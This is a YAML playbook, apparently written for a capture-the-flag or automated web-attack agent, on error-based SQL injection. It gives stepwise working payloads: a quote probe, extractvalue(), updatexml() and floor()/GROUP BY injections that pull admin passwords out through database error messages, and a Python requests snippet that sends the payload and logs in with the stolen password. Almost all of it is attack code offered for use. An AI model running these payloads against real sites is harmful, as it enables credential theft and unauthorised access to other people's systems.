name: error_based_blind_sql_injection
category: web
tags: [sqli, sql_injection, error_based, blind_sqli, data_exfiltration]
indicators:
  - "SQL query without sanitization"
  - "Error messages displayed"
  - "extractvalue() or updatexml()"
  - "Unescaped user input in SQL"

tricks:
  - name: "Step 1: Discover injection point"
    when: "Analyze source code"
    how: "Find unescaped input in SQL"
    payload: |
      # index.php has injection point:
      $unescaped_category = $_GET['category'];
      $result = $conn->query("SELECT ... WHERE category = '" . $unescaped_category . "'");

  - name: "Step 2: Test injection"
    when: "Found injection point"
    how: "Try basic payloads"
    payload: |
      GET /?category='
      # If SQL error, injection exists

  - name: "Step 3: Use error-based extraction"
    when: "Need to extract data"
    how: "Use extractvalue or updatexml"
    payload: |
      ' AND extractvalue(1, concat(0x7e, (SELECT password FROM admins LIMIT 1))) #
      # Error message: XPATH syntax error: '~ONEverySecurePassword_!'

  - name: "Step 4: Extract password and login"
    when: "Got password from error"
    how: "Parse error message and login"
    payload: |
      payload = "' AND extractvalue(1, concat(0x7e, (SELECT password FROM admins LIMIT 1))) #"
      resp = requests.get(url, params={'category': payload})
      # Extract password from error message
      # Login with extracted password to get flag

  - name: "Alternative: Other error-based techniques"
    when: "extractvalue not available"
    how: "Use other functions"
    payload: |
      # updatexml()
      ' AND updatexml(1, concat(0x7e, (SELECT password FROM admins)), 1) #
      
      # floor() + group by
      ' UNION SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT password FROM admins),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a #

